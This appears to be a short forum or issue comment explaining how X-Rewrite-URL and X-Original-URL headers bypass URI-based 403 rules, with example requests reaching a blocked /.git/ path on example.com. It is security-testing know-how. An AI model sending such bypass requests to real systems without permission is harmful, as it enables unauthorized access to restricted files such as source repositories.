Hey, I think you are using X-Original-Url / X-Rewrite-Url vector in a wrong way. These headers usually help to bypass front server rules, which are based on URI, but you don't change URI while using these headers.

First, normal request returns 403:

```
GET /.git/ HTTP/1.1
Host: example.com
```

This attempt to bypass will return 403 too, because URI hasn't changed and the rule still applies:

```
GET /.git/ HTTP/1.1
Host: example.com
X-Rewrite-URL: /.git/
```

This one should bypass the restriction:

```
GET / HTTP/1.1
Host: example.com
X-Rewrite-URL: /.git/
```
